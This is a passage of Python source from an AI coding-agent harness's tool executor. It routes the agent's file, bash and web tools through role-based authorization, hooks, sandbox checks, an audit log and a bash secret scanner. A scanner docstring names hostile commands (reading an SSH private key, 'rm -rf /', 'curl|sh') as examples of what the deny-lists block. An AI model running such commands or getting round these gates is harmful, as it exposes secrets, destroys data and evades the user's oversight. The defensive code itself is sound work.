    same large file dozens of times during a refactor (bug 172455: 149 reads of
    one 77k file, ~$50/turn). Allow tool output to use ~45% of the window
    (~4 chars/token), leaving room for system + conversation + generation. Never
    drop below today's 60k floor, so small models are unaffected.
    """
    floor = _TOOL_CONTEXT_CHAR_BUDGET
    try:
        ctx = int(getattr(caps, "context_window", 0) or 0)
    except Exception:
        ctx = 0
    if ctx <= 0:
        return floor
    return max(floor, int(ctx * 0.45 * 4))


def _elide_old_tool_results(
    api_messages: list[dict],
    *,
    char_budget: int = _TOOL_CONTEXT_CHAR_BUDGET,
    keep_recent: int = _TOOL_KEEP_RECENT,
) -> int:
    """Semantic context editing inside a long tool-call loop.

    Over up to 50 rounds, accumulated ``role=="tool"`` outputs can
    dominate the input-token budget. When their combined size exceeds
    ``char_budget``, replace the OLDEST tool-result contents with a short
    placeholder — keeping the most recent ``keep_recent`` verbatim — so
    the model still has its current evidence + all of its own reasoning.

    Protocol-safe: only ``content`` is replaced, never the message
    itself, so each ``tool_call_id`` stays matched to its assistant
    ``tool_calls``. User / system / assistant messages are never touched
    (that is the difference from a blind head+tail trim). Returns the
    number of tool results elided. Mutates ``api_messages`` in place.
    """
    tool_idxs = [i for i, m in enumerate(api_messages)
                 if m.get("role") == "tool"]

    def _tool_chars() -> int:
        return sum(len(str(api_messages[i].get("content", "")))
                   for i in tool_idxs)

    if _tool_chars() <= char_budget:
        return 0
    editable = tool_idxs[:-keep_recent] if keep_recent > 0 else tool_idxs
    elided = 0
    for i in editable:
        if _tool_chars() <= char_budget:
            break
        content = str(api_messages[i].get("content", ""))
        if content.startswith(_ELIDED_PREFIX):
            continue
        api_messages[i]["content"] = (
            f"{_ELIDED_PREFIX} — {len(content)} chars; "
            f"its findings are reflected in the assistant reasoning above]"
        )
        elided += 1
    return elided


# --- Workspace file-scan tuning (grep_file / list_files) --------------------
# The scan walked the WHOLE tree (rglob("*")) and read every file as text —
# including .venv (41k files) and agent_workspace (27k files), plus binary
# .dat locale blobs. A single grep spent 4+ minutes and returned binary junk.
# The walk now prunes ignored directories in place, skips binaries, and caps
# file size, so a repo grep drops from ~240s to milliseconds.
_SCAN_SKIP_DIRS = frozenset({
    ".git", "__pycache__", ".venv", "venv", "env", ".env", "node_modules",
    "site-packages", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".tox",
    ".nox", "build", "dist", ".runtime_cache", ".delfin", ".claude", ".idea",
    ".vscode", ".ipynb_checkpoints", ".cache", ".eggs", "htmlcov",
})
_SCAN_SKIP_SUFFIXES = frozenset({
    ".pyc", ".pyo", ".so", ".o", ".a", ".lib", ".dll", ".dylib", ".class",
    # The ".npz" below is a generic binary suffix the workspace file-scan skips
    # (a performance filter), NOT a CCDC/CSD data reference — hence the inline
    # license-guard allow on that exact line.
    ".jar", ".exe", ".bin", ".dat", ".npy", ".npz", ".pkl", ".pickle", ".pt",  # license-guard: allow
    ".pth", ".ckpt", ".onnx", ".h5", ".hdf5", ".parquet", ".gz", ".bz2", ".xz",
    ".zip", ".tar", ".7z", ".whl", ".pdf", ".png", ".jpg", ".jpeg", ".gif",
    ".ico", ".bmp", ".webp", ".svg", ".mp4", ".mp3", ".wav", ".ogg", ".woff",
    ".woff2", ".ttf", ".eot", ".db", ".sqlite", ".sqlite3",
})
_SCAN_MAX_FILE_BYTES = 5 * 1024 * 1024  # skip files larger than 5 MB


def _gitignore_skip_dirs(root: Path) -> frozenset[str]:
    """Directory names to prune, harvested from the repo-root ``.gitignore``.

    Only SIMPLE directory entries are honored (``foo`` or ``foo/`` with no
    slash-in-the-middle and no glob metacharacters) — enough to catch the real
    bloat dirs (``.venv/``, ``agent_workspace/``, ``.runtime_cache/``) without
    reimplementing full gitignore semantics. Anything the user gitignores as a
    plain directory is thus pruned automatically.
    """
    names: set[str] = set()
    try:
        text = (root / ".gitignore").read_text(encoding="utf-8", errors="replace")
    except Exception:
        return frozenset()
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith("!"):
            continue
        entry = line.rstrip("/")
        if not entry or any(ch in entry for ch in "/*?[]"):
            continue
        names.add(entry)
    return frozenset(names)


def _looks_binary(path: Path) -> bool:
    """Heuristic binary sniff: a NUL byte in the first 8 KiB (as grep/rg do)."""
    try:
        with open(path, "rb") as fh:
            return b"\x00" in fh.read(8192)
    except Exception:
        return True  # unreadable -> treat as skippable


def _as_int(value, default: int) -> int:
    """Coerce a tool-call argument to int, tolerating weak-model quirks.

    Weak models (qwen3.5, gpt-4-mini, ...) routinely emit numeric tool args as
    STRINGS (``"offset": "200"``) or floats. Without coercion, downstream
    arithmetic/slicing (``offset + limit``, ``len(m) >= max_results``) raises a
    ``TypeError`` that crashes the whole turn. Accepts int / "200" / 200.0 /
    "200.0"; anything unparseable falls back to ``default``.
    """
    if value is None or value == "":
        return default
    try:
        return int(value)
    except (TypeError, ValueError):
        try:
            return int(float(value))
        except (TypeError, ValueError):
            return default


def _iter_scan_files(search_path: Path, extra_skip_dirs: frozenset[str]):
    """Yield candidate files under ``search_path``, pruning ignored dirs.

    Uses ``os.walk(topdown=True)`` so ignored directories are pruned BEFORE
    descending into them — the walk never stats the 68k files inside
    ``.venv``/``agent_workspace``. Order is deterministic (sorted).
    """
    if search_path.is_file():
        yield search_path
        return
    skip = _SCAN_SKIP_DIRS | extra_skip_dirs
    for dirpath, dirnames, filenames in os.walk(search_path, topdown=True):
        dirnames[:] = sorted(
            d for d in dirnames
            if d not in skip and not d.startswith(".venv")
        )
        for name in sorted(filenames):
            yield Path(dirpath) / name


class _DocToolExecutor:
    """Lazy-loaded local executor for doc and calc search tools."""

    def __init__(self) -> None:
        self._engine = None
        self._index: dict | None = None
        self._calc_engine = None
        self._calc_dirs: dict[str, str] = {}  # set by caller

    def _ensure_loaded(self) -> bool:
        """Load doc index and build search engine. Returns True if ready."""
        if self._engine is not None:
            return True
        try:
            from delfin.doc_server.indexer import get_default_index_path
            idx_path = get_default_index_path()
            if not idx_path.exists():
                return False
            self._index = json.loads(idx_path.read_text(encoding="utf-8"))
            from delfin.doc_server.search import DocSearchEngine
            self._engine = DocSearchEngine(self._index)
            return True
        except Exception:
            return False

    def _ensure_calc_loaded(self) -> bool:
        """Build calc index on first use. Returns True if ready."""
        if self._calc_engine is not None:
            return True
        try:
            from pathlib import Path
            from delfin.doc_server.calc_indexer import build_calc_index
            from delfin.doc_server.calc_search import CalcSearchEngine

            calc_dir = Path(self._calc_dirs.get("calc", "~/calc")).expanduser()
            archive_dir = Path(self._calc_dirs.get("archive", "~/archive")).expanduser()
            remote = self._calc_dirs.get("remote_archive", "")
            remote_dir = Path(remote).expanduser() if remote else None

            idx = build_calc_index(
                calc_dir=calc_dir if calc_dir.is_dir() else None,
                archive_dir=archive_dir if archive_dir.is_dir() else None,
                remote_archive_dir=remote_dir if remote_dir and remote_dir.is_dir() else None,
                quiet=True,
            )
            self._calc_engine = CalcSearchEngine(idx)
            return True
        except Exception:
            return False

    def execute(
        self,
        name: str,
        arguments: dict,
        permissions: Optional["KitToolPermissions"] = None,
    ) -> str:
        """Execute a doc/calc/coding tool by name. Returns the result string.

        ``permissions`` activates the coding-agent tools (write_file, edit_file,
        bash) and gates them through workspace sandbox + denylist + optional
        confirm callback. When None, those tools are unavailable.
        """
        if permissions is not None and permissions.pre_tool_hook:
            try:
                permissions.pre_tool_hook(name, arguments)
            except Exception:
                pass

        # Settings-driven PreToolUse hooks (.delfin-native).
        # A blocking hook short-circuits dispatch and surfaces the
        # reason back to the agent as the tool result so it can react.
        block_reason = ""
        if permissions is not None:
            try:
                from . import hooks as _hooks_mod
                cfg = _hooks_mod.load_hooks(permissions.workspace)
                if not cfg.is_empty():
                    pre_results = _hooks_mod.run_hooks(
                        "PreToolUse", cfg,
                        tool_name=name, arguments=arguments,
                        workspace=permissions.workspace,
                    )
                    blk = _hooks_mod.first_block(pre_results)
                    if blk is not None:
                        block_reason = blk.reason or blk.stderr or "blocked by PreToolUse hook"
            except Exception:
                pass

        # Central authorization checkpoint (deny-by-default per role). Every
        # tool passes through here before dispatch, so a role's execution
        # allow-list holds even if the tool was advertised or mcp__-namespaced
        # by another layer, and even if a per-tool handler forgot its own gate.
        auth_role = getattr(permissions, "agent_role", "") if permissions else ""
        if permissions is not None and _tool_denied_for_role(auth_role, name):
            result = json.dumps({"error": (
                f"Tool '{name}' is not available to the '{auth_role}' role. "
                "The dashboard guide operates the UI via ACTION: slash-commands "
                "and researches via search_docs — it does not read/edit source "
                "or run shell commands."
            )})
        elif block_reason:
            result = json.dumps({
                "error": "blocked_by_hook",
                "reason": block_reason[:1200],
            })
        else:
            result = self._dispatch(name, arguments, permissions)

        # Track mtime after a successful read_file so edit_file can verify the
        # file hasn't changed since the agent last read it.
        if (
            permissions is not None
            and name == "read_file"
            and not result.startswith('{"error"')
        ):
            try:
                full = self._workspace_root(permissions) / arguments.get("path", "")
                if full.is_file():
                    permissions.read_tracker[str(full.resolve())] = full.stat().st_mtime
            except Exception:
                pass

        if permissions is not None and permissions.post_tool_hook:
            try:
                permissions.post_tool_hook(name, arguments, result)
            except Exception:
                pass

        # Settings-driven PostToolUse hooks. Output goes to stderr/audit
        # (not back to the model) so a noisy linter doesn't pollute the
        # tool result the agent reads.
        if permissions is not None and not block_reason:
            try:
                from . import hooks as _hooks_mod
                cfg = _hooks_mod.load_hooks(permissions.workspace)
                if not cfg.is_empty():
                    _hooks_mod.run_hooks(
                        "PostToolUse", cfg,
                        tool_name=name,
                        arguments={**arguments, "result_preview": (result or "")[:400]},
                        workspace=permissions.workspace,
                    )
            except Exception:
                pass

        # Audit log: record every code-modifying or persistence action
        # for retracing and rollback. Failures are silent (the audit
        # log must never disturb the tool path it observes).
        try:
            self._audit_call(name, arguments, permissions, result)
        except Exception:
            pass

        # Record failure for retrospective learning — agents that hit the
        # same (tool, command-shape, error-shape) >=3 times in 1 h get a
        # heads-up via the failure log so they can change approach.
        try:
            if (result or "").lstrip().startswith('{"error"'):
                from . import failure_log as _fl
                cmd_repr = (
                    arguments.get("command")
                    or arguments.get("file_path")
                    or arguments.get("path")
                    or ""
                )
                _fl.record_failure(
                    tool=name, command=str(cmd_repr)[:300],
                    error=str(result)[:300],
                    session_id=getattr(permissions, "task_session_id", "") or "",
                )
        except Exception:
            pass

        return result

    _AUDITED_TOOLS = frozenset({
        "write_file", "edit_file", "multi_edit",
        "bash", "bash_background", "bash_kill",
        "notebook_edit",
        "remember_permission", "remember_permission_bundle",
    })

    def _audit_call(
        self,
        name: str,
        arguments: dict,
        permissions: Optional["KitToolPermissions"],
        result: str,
    ) -> None:
        """Append one audit-log line if ``name`` is a tracked tool."""
        if name not in self._AUDITED_TOOLS:
            return
        from . import audit_log as _al
        # Best-effort decision parsing.
        decision = "ok"
        if isinstance(result, str):
            if result.startswith('{"error"'):
                decision = "denied"
            elif '"status": "denied"' in result[:200]:
                decision = "denied"
        mode = ""
        session_id = ""
        if permissions is not None:
            mode = getattr(permissions, "mode", "") or ""
        record = _al.make_record(
            tool=name,
            decision=decision,
            mode=mode,
            path=str(arguments.get("path", "")),
            command=str(arguments.get("command", "")),
            session_id=session_id,
        )
        _al.append(record)

    def _dispatch(
        self,
        name: str,
        arguments: dict,
        permissions: Optional["KitToolPermissions"],
    ) -> str:
        # Coding-agent tools are only available with explicit permissions.
        if name in ("write_file", "edit_file", "multi_edit",
                    "bash", "bash_background"):
            if permissions is None:
                return json.dumps({"error": (
                    f"Tool '{name}' requires permissions to be configured. "
                    "Pass a KitToolPermissions instance to OpenAIClient."
                )})
            # bash_background reuses the bash gate verbatim — the
            # command, cwd, deny-list, secret scanner, and auto-allow
            # check are identical; only the execution model differs.
            gate_name = "bash" if name == "bash_background" else name
            gate_err = self._run_permission_gate(gate_name, arguments, permissions)
            if gate_err is not None:
                return json.dumps({"error": gate_err})
            if name == "write_file":
                return self._execute_write_file(arguments, permissions)
            if name == "edit_file":
                return self._execute_edit_file(arguments, permissions)
            if name == "multi_edit":
                return self._execute_multi_edit(arguments, permissions)
            if name == "bash":
                return self._execute_bash(arguments, permissions)
            if name == "bash_background":
                return self._execute_bash_background(arguments, permissions)

        # Background-job inspection tools — no command execution, just
        # reading the registry. Permissions optional.
        if name in ("bash_status", "bash_output", "bash_kill"):
            if name == "bash_status":
                return self._execute_bash_status(arguments)
            if name == "bash_output":
                return self._execute_bash_output(arguments)
            if name == "bash_kill":
                return self._execute_bash_kill(arguments)

        # Notebook tools — file-level operations, sandbox + Self-Mod-Guard
        # apply for the write side via the same gate as edit_file.
        if name in ("notebook_read", "notebook_edit"):
            if permissions is None:
                return json.dumps({"error": (
                    f"Tool '{name}' requires permissions to be configured."
                )})
            if name == "notebook_edit":
                # Reuse edit_file's gate (Self-Mod-Guard, sandbox check).
                gate_err = self._run_permission_gate(
                    "edit_file", arguments, permissions
                )
                if gate_err is not None:
                    return json.dumps({"error": gate_err})
                return self._execute_notebook_edit(arguments, permissions)
            return self._execute_notebook_read(arguments, permissions)

        # Structured user question: surfaces a dialog in the UI and
        # blocks until the user picks an option. Headless callers
        # (no ask_user_callback) get an explicit not-available error.
        if name == "ask_user_question":
            return self._execute_ask_user_question(arguments, permissions)

        # Plan-mode roundtrip. exit_plan_mode submits the plan and (on
        # approval) flips the permission mode so subsequent turns can
        # actually act on the plan.
        if name == "exit_plan_mode":
            return self._execute_exit_plan_mode(arguments, permissions)

        # Skill invocation: returns the skill body so the agent reads
        # and follows it. Read-only filesystem access, no gate needed.
        if name == "skill":
            return self._execute_skill(arguments, permissions)

        # Sub-agent delegation: spawn an isolated tool-calling loop
        # via the runner the parent OpenAIClient attached.
        if name == "subagent":
            return self._execute_subagent(arguments, permissions)
        if name == "subagent_result":
            return self._execute_subagent_result(arguments)

        # Worktree isolation: create / tear down a temporary
        # git-worktree-on-branch sandbox for the current task.
        if name == "enter_worktree":
            return self._execute_enter_worktree(arguments, permissions)
        if name == "exit_worktree":
            return self._execute_exit_worktree(arguments, permissions)
        if name == "worktree_merge":
            return self._execute_worktree_merge(arguments, permissions)

        # Scheduler: one-shot wake-ups + interval cron.
        if name in ("schedule_wakeup", "cron_create",
                    "cron_list", "cron_delete"):
            return self._execute_scheduler(name, arguments)

        # Notifications + remote triggers.
        if name == "push_notification":
            return self._execute_push_notification(arguments)
        if name == "remote_trigger":
            return self._execute_remote_trigger(arguments, permissions)

        # Phase 7: one-call project introspection.
        if name == "project_introspect":
            return self._execute_project_introspect(arguments, permissions)

        # Phase 6: structured test runner, patch applier, code nav.
        if name == "run_tests":
            return self._execute_run_tests(arguments, permissions)
        if name == "apply_patch":
            return self._execute_apply_patch(arguments, permissions)
        if name in ("find_definition", "find_references"):
            return self._execute_code_nav(name, arguments, permissions)

        # Planning tools — metadata operations on the workspace's task store
        # (the JSON file lives under the workspace, sandboxed by definition).
        # Read paths (task_list/task_get) need no gate; the create/start paths
        # gate on plan mode INSIDE the executors (a task going in_progress is an
        # execution act — see _execute_task_create / _execute_task_update).
        if name in ("task_create", "task_update", "task_list"):
            if permissions is None:
                return json.dumps({"error": (
                    f"Tool '{name}' requires permissions to be configured."
                )})
            if name == "task_create":
                return self._execute_task_create(arguments, permissions)
            if name == "task_update":
                return self._execute_task_update(arguments, permissions)
            if name == "task_list":
                return self._execute_task_list(arguments, permissions)
            if name == "task_get":
                return self._execute_task_get(arguments, permissions)

        # Web tools — outbound HTTP, no filesystem side-effects. The
        # web_tools module enforces its own URL deny-list (localhost /
        # RFC1918 / cloud metadata) and binary-content rejection.
        if name in ("web_search", "web_fetch"):
            if name == "web_search":
                return self._execute_web_search(arguments)
            return self._execute_web_fetch(arguments)

        if name == "remember_permission":
            if permissions is None:
                return json.dumps({"error": (
                    "remember_permission requires KIT permissions to be configured."
                )})
            return self._execute_remember_permission(arguments, permissions)

        if name == "remember_permission_bundle":
            if permissions is None:
                return json.dumps({"error": (
                    "remember_permission_bundle requires KIT permissions to be configured."
                )})
            return self._execute_remember_permission_bundle(arguments, permissions)

        # Calc search tools
        if name in ("search_calcs", "get_calc_info", "calc_summary"):
            return self._execute_calc(name, arguments)

        # Repo file-access tools read the workspace filesystem directly and do
        # NOT need the doc index — dispatch them BEFORE the doc-index gate so
        # they work in any (un-indexed) workspace. Bug found via live test:
        # they previously fell through to the gate and failed with "Doc index
        # not available", which broke read-only subagents (explore/plan) that
        # cannot fall back to bash.
        if name == "read_file":
            return self._execute_read_file(arguments, permissions)
        elif name == "view_image":
            return self._execute_view_image(arguments, permissions)
        elif name == "remember":
            return self._execute_remember(arguments, permissions)
        elif name == "grep_file":
            return self._execute_grep_file(arguments, permissions)
        elif name == "list_files":
            return self._execute_list_files(arguments, permissions)

        # Doc-index tools below (search_docs / read_section / list_docs /
        # list_sections) require the prebuilt index.
        if not self._ensure_loaded():
            return json.dumps({"error": "Doc index not available. Run delfin-docs-index."})

        if name == "search_docs":
            results = self._engine.search(
                query=arguments.get("query", ""),
                doc_filter=arguments.get("doc_filter", ""),
                max_results=arguments.get("max_results", 10),
            )
            return json.dumps(results, indent=2, ensure_ascii=False)

        elif name == "read_section":
            doc_id = arguments.get("doc_id", "")
            section_id = arguments.get("section_id", "")
            doc = self._index.get("documents", {}).get(doc_id)
            if not doc:
                available = list(self._index.get("documents", {}).keys())
                return f"Document '{doc_id}' not found. Available: {available}"
            section = doc.get("sections", {}).get(section_id)
            if not section:
                available = list(doc.get("sections", {}).keys())[:20]
                return f"Section '{section_id}' not found. First sections: {available}"
            return (
                f"# {section.get('title', section_id)}\n"
                f"Source: {doc.get('title', doc_id)}\n\n"
                f"{section.get('text', '')}"
            )

        elif name == "list_docs":
            docs = []
            for doc_id, doc in self._index.get("documents", {}).items():
                docs.append({
                    "doc_id": doc_id,
                    "title": doc.get("title", ""),
                    "section_count": doc.get("section_count", 0),
                    "total_chars": doc.get("total_chars", 0),
                })
            return json.dumps(docs, indent=2, ensure_ascii=False)

        elif name == "list_sections":
            doc_id = arguments.get("doc_id", "")
            doc = self._index.get("documents", {}).get(doc_id)
            if not doc:
                available = list(self._index.get("documents", {}).keys())
                return f"Document '{doc_id}' not found. Available: {available}"
            sections = []
            for sid, sec in doc.get("sections", {}).items():
                sections.append({
                    "section_id": sid,
                    "title": sec.get("title", ""),
                    "level": sec.get("level", 0),
                    "char_count": len(sec.get("text", "")),
                })
            return json.dumps(sections, indent=2, ensure_ascii=False)

        return json.dumps({"error": f"Unknown tool: {name}"})

    def _execute_calc(self, name: str, arguments: dict) -> str:
        """Execute a calc search tool."""
        if not self._ensure_calc_loaded():
            return json.dumps({"error": "Calc index could not be built. Check calc/archive directories."})

        if name == "search_calcs":
            results = self._calc_engine.search(
                query=arguments.get("query", ""),
                source=arguments.get("source", ""),
                functional=arguments.get("functional", ""),
                basis_set=arguments.get("basis_set", ""),
                solvent=arguments.get("solvent", ""),
                module=arguments.get("module", ""),
                has_data=arguments.get("has_data", ""),
                max_results=arguments.get("max_results", 20),
            )
            return json.dumps(results, indent=2, ensure_ascii=False)

        elif name == "get_calc_info":
            calc_id = arguments.get("calc_id", "")
            info = self._calc_engine.get_calc_info(calc_id)
            if info is None:
                return json.dumps({"error": f"Calculation '{calc_id}' not found."})
            info = self._inject_scientific_check(info)
            return json.dumps(info, indent=2, ensure_ascii=False)

        elif name == "calc_summary":
            return json.dumps(
                self._calc_engine.summary(), indent=2, ensure_ascii=False
            )

        return json.dumps({"error": f"Unknown calc tool: {name}"})

    def _inject_scientific_check(self, info: dict) -> dict:
        """Attach the scientific-correctness critic's red flags to a calc's
        info, so the agent can't inspect a result without seeing them — an SCF
        that never converged, an optimisation on a saddle point (imaginary
        frequencies), heavy spin contamination. Read-only + deterministic; only
        adds the field when there's a real ❌/⚠️, so clean results stay clean.
        Never raises."""
        try:
            path = info.get("path") or ""
            if not path:
                return info
            from .result_critic import (
                critique_folder, worst_level, format_report)
            by_file = critique_folder(path)
            if not by_file:
                return info
            worst = "ok"
            for crits in by_file.values():
                wl = worst_level(crits)
                if wl == "error":
                    worst = "error"
                    break
                if wl == "warn" and worst != "error":
                    worst = "warn"
            if worst == "ok":
                return info
            return {**info, "scientific_check": {
                "worst": worst,
                "report": format_report(by_file),
                "note": ("Read-only correctness flags — do NOT report this "
                         "result as trustworthy until the ❌/⚠️ are addressed."),
            }}
        except Exception:
            return info

    # -- Repo file access tools -----------------------------------------------

    def _repo_root(self) -> Path:
        """Best-effort repo root from common locations."""
        # Check if cwd was set (via engine)
        for candidate in [
            Path.cwd(),
            Path(__file__).resolve().parent.parent.parent,  # delfin/agent/api_client.py → repo
        ]:
            if (candidate / "delfin").is_dir():
                return candidate
        return Path.cwd()

    def _execute_read_file(
        self, arguments: dict, perms: Optional["KitToolPermissions"] = None
    ) -> str:
        rel_path = self._get_path_arg(arguments)
        if not rel_path:
            return json.dumps({"error": "path is required"})
        root = perms.workspace if perms is not None else self._repo_root()
        full = (root / rel_path) if not Path(rel_path).is_absolute() else Path(rel_path)

        # Read-gate: secrets are hard-denied; reads outside the allowed
        # workspace roots require an explicit user confirmation.
        if perms is not None:
            err = self._check_read_access(perms, full, label=rel_path)
            if err is not None:
                return json.dumps({"error": err})

        if not full.exists():
            return json.dumps({"error": f"File not found: {rel_path}"})
        if full.is_dir():
            entries = sorted(p.name for p in full.iterdir())[:50]
            return json.dumps({"type": "directory", "entries": entries})
        if full.suffix.lower() in (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp"):
            return json.dumps({"error": (
                f"{rel_path} is an image, not text — reading it as text gives "
                "garbage. Use the view_image tool to actually LOOK at it.")})
        try:
            lines = full.read_text(encoding="utf-8", errors="replace").splitlines()
        except Exception as exc:
            return json.dumps({"error": str(exc)})
        offset = _as_int(arguments.get("offset"), 0)
        limit = _as_int(arguments.get("limit"), 200)
        if offset < 0:
            offset = 0
        if limit <= 0:
            limit = 200
        selected = lines[offset:offset + limit]
        result = "\n".join(f"{i + offset}  {line}" for i, line in enumerate(selected))
        if len(lines) > offset + limit:
            result += f"\n... ({len(lines)} lines total, showing {offset}-{offset + limit})"
        return result

    def _execute_view_image(
        self, arguments: dict, perms: Optional["KitToolPermissions"] = None
    ) -> str:
        rel_path = self._get_path_arg(arguments)
        if not rel_path:
            return json.dumps({"error": "path is required"})
        root = perms.workspace if perms is not None else self._repo_root()
        full = (root / rel_path) if not Path(rel_path).is_absolute() else Path(rel_path)
        # Same read-gate as read_file: secrets denied, outside-workspace needs
        # the user's confirm. Images aren't special-cased for safety.
        if perms is not None:
            err = self._check_read_access(perms, full, label=rel_path)
            if err is not None:
                return json.dumps({"error": err})
        try:
            from .image_input import load_image
            img = load_image(full)
        except Exception as exc:
            return json.dumps({"error": f"cannot load image: {exc}"})
        # A tool result can only carry text, so stash the loaded image; the
        # stream loop injects it as visual content for the NEXT model round.
        pend = getattr(self, "_pending_view_images", None)
        if pend is None:
            pend = self._pending_view_images = []
        pend.append(img)
        return json.dumps({
            "status": "ok",
            "path": str(full),
            "mime": img.mime,
            "bytes": img.size_bytes(),
            "note": ("The image is shown to you in the next message — look at "
                     "it and describe / use what you SEE."),
        })

    def _execute_remember(
        self, arguments: dict, perms: Optional["KitToolPermissions"] = None
    ) -> str:
        text = (arguments.get("text") or "").strip()
        if not text:
            return json.dumps({"error": "text is required"})
        memory_type = (arguments.get("type") or "").strip().lower() or None
        title = (arguments.get("title") or "").strip() or None
        root = perms.workspace if perms is not None else self._repo_root()
        try:
            from .memory_store import save_typed_memory
            path, slug, mtype = save_typed_memory(
                text, repo_root=root, memory_type=memory_type, title=title)
        except Exception as exc:
            return json.dumps({"error": f"could not save memory: {exc}"})
        return json.dumps({
            "status": "ok",
            "type": mtype,
            "slug": slug,
            "note": (f"Saved a '{mtype}' memory. It will be recalled "
                     "automatically at the start of future sessions."),
        })

    def _execute_grep_file(
        self, arguments: dict, perms: Optional["KitToolPermissions"] = None
    ) -> str:
        import re as _re
        pattern = arguments.get("pattern", "")
        if not pattern:
            return json.dumps({"error": "pattern is required"})
        root = perms.workspace if perms is not None else self._repo_root()
        rel = arguments.get("path", "") or ""
        search_path = (root / rel) if not Path(rel).is_absolute() else Path(rel)
        max_results = _as_int(arguments.get("max_results"), 30)
        if max_results <= 0:
            max_results = 30

        # Read-gate on the search root: secret-deny is hard, outside-workspace
        # needs user confirm. (Per-file deny still applies inside the loop.)
        if perms is not None:
            err = self._check_read_access(perms, search_path, label=rel or "(workspace)")
            if err is not None:
                return json.dumps({"error": err})
        try:
            regex = _re.compile(pattern, _re.IGNORECASE)
        except _re.error as exc:
            return json.dumps({"error": f"Invalid regex: {exc}"})
        extra_skip = _gitignore_skip_dirs(root)
        matches = []
        for fp in _iter_scan_files(search_path, extra_skip):
            if fp.suffix.lower() in _SCAN_SKIP_SUFFIXES:
                continue
            try:
                if fp.stat().st_size > _SCAN_MAX_FILE_BYTES:
                    continue
            except OSError:
                continue
            if _looks_binary(fp):
                continue
            try:
                with open(fp, "r", encoding="utf-8", errors="replace") as fh:
                    for i, line in enumerate(fh):
                        if regex.search(line):
                            try:
                                rel_match = fp.relative_to(root)
                            except ValueError:
                                rel_match = fp
                            matches.append(f"{rel_match}:{i + 1}: {line.rstrip()[:200]}")
                            if len(matches) >= max_results:
                                break
            except Exception:
                continue
            if len(matches) >= max_results:
                break
        return "\n".join(matches) if matches else "No matches found."

    def _execute_list_files(
        self, arguments: dict, perms: Optional["KitToolPermissions"] = None
    ) -> str:
        pattern = arguments.get("pattern", "*")
        root = perms.workspace if perms is not None else self._repo_root()
        extra_skip = _gitignore_skip_dirs(root)
        matches = []
        for fp in _iter_scan_files(root, extra_skip):
            try:
                rel = str(fp.relative_to(root))
            except ValueError:
                continue
            # Match against the bare filename too, so a pattern like "*.py"
            # (no directory component) matches nested files as users expect.
            if fnmatch.fnmatch(rel, pattern) or fnmatch.fnmatch(fp.name, pattern):
                matches.append(rel)
                if len(matches) >= 50:
                    break
        return "\n".join(matches) if matches else "No files matching pattern."

    # -- Coding-agent helpers (sandbox + permission gating) -------------------

    def _workspace_root(self, perms: "KitToolPermissions") -> Path:
        return perms.workspace

    def _display_path(self, resolved: Path, perms: "KitToolPermissions") -> str:
        """Render a resolved path as workspace-relative when possible, else absolute."""
        root = perms.find_root_for(resolved)
        if root is not None:
            try:
                return str(resolved.relative_to(root)).replace("\\", "/")
            except Exception:
                pass
        return str(resolved)

    @staticmethod
    def _get_path_arg(arguments: dict) -> str:
        """Extract a path argument tolerating common naming conventions.

        Weak models (qwen3.5, gpt-4-mini, etc.) sometimes generate tool
        calls using the .delfin naming convention (``file_path``)
        when our schema actually declares ``path`` — or invent ``filename`` /
        ``file`` / ``target``. Without this fallback, the tool returns
        ``"path is required"`` and the agent silently retries 4× before
        falling back to a heredoc bash hack.

        Priority: ``path`` > ``file_path`` > ``filename`` > ``file`` > ``target``.
        Strips whitespace; returns ``""`` when none of the keys yields a
        non-empty string.
        """
        for k in ("path", "file_path", "filename", "file", "target"):
            v = arguments.get(k)
            if isinstance(v, str) and v.strip():
                return v.strip()
        return ""

    def _resolve_in_workspace(
        self, rel_path: str, perms: "KitToolPermissions", *, for_read: bool = False
    ) -> tuple[Optional[Path], Optional[str]]:
        """Resolve ``rel_path`` against the workspace and verify containment.

        ``for_read=True`` accepts any REACHABLE root (writable + read-only +
        confirm-write) so reads work everywhere reachable. ``for_read=False``
        (default, WRITE semantics) accepts only WRITABLE roots — so a write
        executor can never touch a read-only dir (archive) even if the gate is
        somehow bypassed (defense in depth). The write GATE resolves for_read
        and applies the per-tier policy (deny read-only, confirm calc).

        Returns (resolved_path, error_message). If error_message is non-None,
        the path is rejected and resolved_path is None.
        """
        if not rel_path:
            return None, "path is required"
        ws = perms.workspace
        candidate = (ws / rel_path) if not Path(rel_path).is_absolute() else Path(rel_path)
        try:
            resolved = candidate.resolve(strict=False)
        except Exception as exc:
            return None, f"cannot resolve path: {exc}"
        root = (perms.find_readable_root_for(resolved) if for_read
                else perms.find_root_for(resolved))
        if root is None:
            _roots = (perms.all_readable_roots() if for_read
                      else perms.all_workspace_roots())
            roots_str = ", ".join(str(r) for r in _roots)
            return None, (
                f"path is outside the allowed workspace roots [{roots_str}]: "
                f"{rel_path}. To work on it, ask the user to GRANT this path "
                f"to the agent (add it via --add-dir / extra_workspace_dirs), "
                f"or move the project into an allowed workspace root. Do NOT "
                f"silently fall back to a manual snippet without telling the "
                f"user that the path must be granted first."
            )
        try:
            rel_str = str(resolved.relative_to(root)).replace("\\", "/")
        except ValueError:
            rel_str = rel_path.replace("\\", "/")
        if perms.matches_path_deny(rel_str):
            return None, f"path is on the deny-list (.git, secrets, keys, .env, ...): {rel_str}"
        return resolved, None

    def _scan_bash_for_secrets(
        self, cmd: str, perms: "KitToolPermissions"
    ) -> Optional[str]:
        """Scan a bash command for path-references to secret-deny globs.

        Bash can reach arbitrary paths via ``cat /home/.../.ssh/id_rsa`` even
        when its ``cwd`` is sandboxed. The standard bash deny-list catches
        catastrophic patterns (``rm -rf /``, ``sudo``, ``curl|sh``) but is
        agnostic of secret paths. This scanner extracts any ``/`` or ``~``
        rooted path-like token from the command and tests it against
        ``perms.path_deny_globs``. Returns the offending token, or None.

        It's intentionally permissive — false positives only block the
        offending command, not the workflow.
        """
        # Strip quoted strings entirely from the scan: even a benign
        # `echo "/home/user/.ssh"` shouldn't be confusing. We replace
        # contents but keep the structure so the regex still locks onto
        # standalone path tokens elsewhere.
        cleaned = re.sub(r"'[^']*'|\"[^\"]*\"", " ", cmd)
        # Match absolute /paths and ~ / $HOME prefixed paths.
        candidates = set(re.findall(
            r"(?<![A-Za-z0-9_])(?:~|\$HOME|/)[^\s;|&<>()`'\"]+",
            cleaned,
        ))
        for tok in candidates:
            try:
                p = Path(tok.replace("$HOME", "~")).expanduser()
